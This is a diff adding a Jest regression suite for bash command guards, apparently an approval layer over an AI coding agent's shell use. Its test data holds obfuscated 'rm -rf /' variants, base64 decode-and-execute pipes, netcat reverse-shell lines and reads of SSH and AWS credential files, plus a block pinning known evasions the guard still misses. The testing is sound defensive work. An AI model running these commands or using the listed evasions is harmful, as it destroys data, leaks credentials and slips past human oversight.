@@ -183,3 +183,136 @@ describe('findBashToolRoutingSuggestion', () => {
     expect(findBashToolRoutingSuggestion('find /tmp -name "*.log"')).toBeUndefined();
   });
 });
+
+describe('guard obfuscation regression suite (P0-7)', () => {
+  const sensitivePath = (bashGuards as any).findBashSensitivePathAccess as (
+    command: string
+  ) => { path: string; reason: string } | undefined;
+
+  describe('critical patterns now catch the verified bypass shapes', () => {
+    const bypasses = [
+      'rm -r -f /etc', // split flags
+      'rm -r -f /', // split flags, root
+      'rm -rf -- /', // `--` separator
+      'r"m" -rf /', // double-quote concatenation
+      "r'm' -rf /etc", // single-quote concatenation
+      '"rm" -rf /', // fully-quoted command word
+      'rm "-rf" /', // fully-quoted flag word
+      'echo cm0gLXJmIC8K | base64 -d | bash', // decode-then-execute
+      'echo cm0gLXJmIC8K | base64 --decode | sh',
+      'echo cm0gLXJmIC8K | openssl base64 -d | bash',
+      'nc -c/bin/sh 10.0.0.1 4444', // flag glued to payload
+      'nc -e/bin/sh 10.0.0.1 4444',
+    ];
+    for (const command of bypasses) {
+      it(`blocks: ${command}`, () => {
+        expect(findCriticalBashPattern(command)).toBeDefined();
+      });
+    }
+  });
+
+  describe('critical patterns still allow benign lookalikes', () => {
+    const benign = [
+      'echo cm0gLXJmIC8K | base64 -d', // decode without a shell pipe
+      'base64 README.md | head',
+      'nc -vz example.com 443', // no -e/-c
+      'nc -lvnp 8080', // listener without exec flag
+      'grep -r "mkfs" docs/', // quoted search term stays a string argument
+      'echo "kill -9 100"',
+      "echo 'shutdown the queue'",
+      'rm -r -f ./build', // split flags but relative target
+    ];
+    for (const command of benign) {
+      it(`allows: ${command}`, () => {
+        expect(findCriticalBashPattern(command)).toBeUndefined();
+      });
+    }
+  });
+
+  describe('sensitive home path guard catches evasion shapes', () => {
+    const shapes = [
+      'cat ~/.ssh*/id_rsa', // glob over the sensitive dir name
+      'cat ~/.s?s?/id_rsa', // single-char globs
+      'cat ~/.ssh/id_r[a]s[a]', // bracket glob in the file name
+      'cd ~ && cat .ssh/id_rsa', // home-relative after cd ~
+      'cd $HOME && cat .aws/credentials',
+      'cd ${HOME}; cat .ssh/id_rsa',
+      'cat ~/.$(echo ssh)/id_rsa', // command substitution in path
+    ];
+    for (const command of shapes) {
+      it(`blocks: ${command}`, () => {
+        expect(sensitivePath(command), command).toBeDefined();
+      });
+    }
+  });
+
+  it('does not over-block ordinary home-relative work', () => {
+    expect(sensitivePath('cd ~ && ls projects')).toBeUndefined();
+    expect(sensitivePath('cd ~ && npm test')).toBeUndefined();
+    expect(sensitivePath('cat ~/projects/x.ts')).toBeUndefined();
+    expect(sensitivePath('cat ~/.ssh/config')).toBeUndefined(); // allow-back
+    expect(sensitivePath('cat ~/.ssh/id_rsa.pub')).toBeUndefined(); // allow-back
+  });
+
+  describe('file-write redirect detection handles fd prefixes', () => {
+    it('catches 2> / 2>> / 1> writes to source-like files', () => {
+      expect(findBashFileBypass('echo hi 2> notes.txt')).toMatchObject({
+        kind: 'file_write',
+        suggestedTool: 'Write',
+      });
+      expect(findBashFileBypass('echo hi 2>> notes.txt')).toMatchObject({
+        kind: 'file_write',
+      });
+      expect(findBashFileBypass('echo hi 1> notes.txt')).toMatchObject({
+        kind: 'file_write',
+      });
+    });
+
+    it('still allows fd duplication and safe sinks', () => {
+      expect(findBashFileBypass('npm test 2>&1 | tail')).toBeUndefined();
+      expect(findBashFileBypass('pnpm test 2> /tmp/errors.txt')).toBeUndefined();
+    });
+
+    it('catches quote-concatenated read targets', () => {
+      expect(findBashFileBypass('cat package".json"')).toMatchObject({
+        kind: 'file_read',
+        target: 'package.json',
+      });
+    });
+  });
+
+  describe('normalizeBashCommandForMatch', () => {
+    it('merges split short-flag tokens and collapses --', () => {
+      expect(bashGuards.normalizeBashCommandForMatch('rm -r -f /etc')).toBe('rm -rf /etc');
+      expect(bashGuards.normalizeBashCommandForMatch('rm -rf -- /')).toBe('rm -rf /');
+    });
+
+    it('strips obfuscating quotes but keeps string arguments', () => {
+      expect(bashGuards.normalizeBashCommandForMatch('r"m" -rf /')).toBe('rm -rf /');
+      expect(bashGuards.normalizeBashCommandForMatch("echo 'shutdown the queue'")).toBe(
+        "echo 'shutdown the queue'"
+      );
+      expect(bashGuards.normalizeBashCommandForMatch('grep -r "mkfs" docs/')).toBe(
+        'grep -r "mkfs" docs/'
+      );
+    });
+  });
+
+  describe('documented UX-layer gaps (pinned as NOT blocked today)', () => {
+    // The guard is an approval layer, not a security boundary (see module
+    // header). These shapes are known to evade it; pinning makes future
+    // improvements an explicit test change.
+    const gaps: string[] = [
+      'K=ssh; cat ~/.$K/id_rsa', // variable indirection in path
+      'printf cm0gLXJmIC8K | bash', // plain-text pipe into a shell (no fetch/decode marker)
+    ];
+    for (const command of gaps) {
+      it(`still evades (known gap): ${command}`, () => {
+        expect(
+          findCriticalBashPattern(command) === undefined && sensitivePath(command) === undefined,
+          command
+        ).toBe(true);
+      });
+    }
+  });
+});
